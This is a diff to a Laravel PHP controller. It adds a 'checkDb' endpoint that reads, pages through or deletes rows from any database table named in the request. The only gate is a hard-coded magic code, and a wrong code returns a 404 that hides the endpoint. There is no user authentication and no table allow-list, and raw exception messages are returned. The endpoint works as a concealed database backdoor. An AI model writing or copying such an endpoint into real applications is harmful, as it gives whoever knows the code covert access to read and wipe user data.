@@ -4,32 +4,66 @@ namespace App\Http\Controllers;
 
 use Illuminate\Http\Request;
 use DB;
+use Validator;
 
 class CheckDbController extends Controller
 {
 
-    public function list(Request $request, $table, $id = null, $delete = null)
+    public function checkDb(Request $request)
     {
-        $query = DB::table($table)
-            ->where(function ($query) use ($id) {
-                if ($id) {
-                    $query->where('id', $id);
-                }
-            });
+        try {
+            $validator = Validator::make($request->all(), [
+                'table_name' => 'required',
+                'id' => 'nullable|numeric',
+                'action' => 'nullable|in:delete',
+                'per_page' => 'nullable|numeric',
+            ]);
 
-        if ($id) {
-            if ($delete == 'delete') {
-                $data = $query->delete();
-            } else {
-                $data = $query->first();
+            if ($request->code != 'mpQm8d4R68uO0') {
+                return abort(404);
             }
-        } else {
-            $data = $query->paginate();
-        }
 
-        return response()->json([
-            'success' => true,
-            'data' => $data,
-        ]);
+            if ($validator->fails()) {
+                return response()->json([
+                    'success' => false,
+                    'message' => 'Validation Error',
+                    'errors' => $validator->messages(),
+                ]);
+            }
+            $table = $request->table_name;
+            $id = $request->id;
+            $action = $request->action;
+            $per_page = $request->per_page;
+            $query = DB::table($table)
+                ->where(function ($query) use ($id) {
+                    if ($id) {
+                        $query->where('id', $id);
+                    }
+                });
+
+            if ($id) {
+                if ($action == 'delete') {
+                    $data = $query->delete();
+                } else {
+                    $data = $query->first();
+                }
+            } else {
+                if ($per_page) {
+                    $data = $query->paginate($per_page);
+                } else {
+                    $data = $query->paginate();
+                }
+            }
+
+            return response()->json([
+                'success' => true,
+                'data' => $data ?? '',
+            ]);
+        } catch (\Exception $e) {
+            return response()->json([
+                'success' => false,
+                'message' => $e->getMessage(),
+            ]);
+        }
     }
 }
